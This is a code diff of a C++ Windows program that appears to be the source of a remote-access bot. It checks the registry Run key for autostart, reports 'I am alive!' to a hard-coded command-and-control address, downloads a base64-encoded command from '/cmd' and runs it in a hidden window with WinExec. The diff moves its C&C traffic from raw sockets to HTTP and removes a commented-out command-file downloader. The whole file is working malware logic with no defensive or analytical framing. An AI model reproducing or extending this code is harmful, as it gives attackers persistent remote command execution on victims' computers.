@@ -7,10 +7,11 @@
 #include "Connection.h"
 #include "base64.h"
 
-char* ip = "192.168.0.45";
+string ip = "192.168.0.45";
+//string ip = "192.168.0.10";
 TCHAR buf[255] = { 0 };
 Utils utils;
-Connection conn(ip, 80);
+Connection conn(ip);
 base64 base;
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
@@ -22,6 +23,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 	//utils.DenyAccess();
 
 	//Accessing the registry value for autoloading
+
 
 	HKEY hKey;
 	if(RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
@@ -61,34 +63,12 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 		utils.GenerateID();
 	}
 
-	// Reading a command to execute
-	char* cmdptr = conn.ReadCommand(); 
-	string command = string(cmdptr, strlen(cmdptr));
-	command = base.base64_decode(command);
-	WinExec(command.c_str(), SW_HIDE);
+	// sending an initial message to C&C
+	conn.HTTPPost(utils.GetID(), "I am alive!");
 
-	// Sending hello to the server
-	Connection conn(ip, 80);
-	conn.SendBasicInfo(utils.GetID(), "I am alive!");
-
-	// Sending an ID and a message 
-	//conn.Send(utils.GetID());
-	//conn.Send("I am alive!");
-	/*
-	TCHAR url[] = TEXT("http://127.0.0.1/cmd");
-	TCHAR path[MAX_PATH + 1];
-	DWORD len = MAX_PATH + 1;
-	GetTempPath(len, path);
-	TCHAR* full_path = _tcscat(path, L"command.txt");
-	wstring ws(full_path);
-	string Path = string(ws.begin(), ws.end());
-	utils.DownloadFile(url, full_path);
-
-	ifstream ffi(full_path);
-	string based_string;
-	ffi >> based_string;
-	based_string = base.base64_decode(based_string);
-	*/
+	// getting a command from C&C and starting
+	conn.HTTPGet("/cmd");
+	WinExec(base.base64_decode(conn.GetBuffer()).c_str(), SW_HIDE);
 
 	return 0;
 }
